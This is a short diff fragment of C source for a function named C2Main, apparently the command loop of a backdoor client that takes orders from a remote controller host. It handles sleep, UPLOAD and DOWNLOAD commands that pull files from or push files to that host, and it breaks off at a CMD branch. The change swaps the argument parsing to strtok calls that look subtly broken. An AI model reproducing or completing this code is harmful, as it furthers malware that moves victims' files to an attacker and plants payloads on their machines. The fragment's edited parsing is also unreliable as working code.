@@ -469,11 +469,10 @@ BOOL C2Main(char* host){
 		Sleep(1000 * atoi(strstr(buf, " ") + 1));
 	}
 	else if (strncmp(buf, "UPLOAD", strlen("UPLOAD")) == 0){
-		// origin did something more accurate and more complicated
-		return DownloadToFile(host, atoi(strchr(buf, ' ') + 1), strrchr(buf, ' ') + 1);
+		return DownloadToFile(host, atoi(strtok(buf, " ") + 1), strtok(NULL, " ") + 1);
 	}
 	else if (strncmp(buf, "DOWNLOAD", strlen("DOWNLOAD")) == 0){
-		return UploadFile(host, atoi(strchr(buf, ' ') + 1), strrchr(buf, ' ') + 1);
+		return UploadFile(host, atoi(strtok(buf, " ") + 1), strtok(NULL, " ") + 1);
 	}
 	else if (strncmp(buf, "CMD", strlen("CMD")) == 0){
 		//complicated 
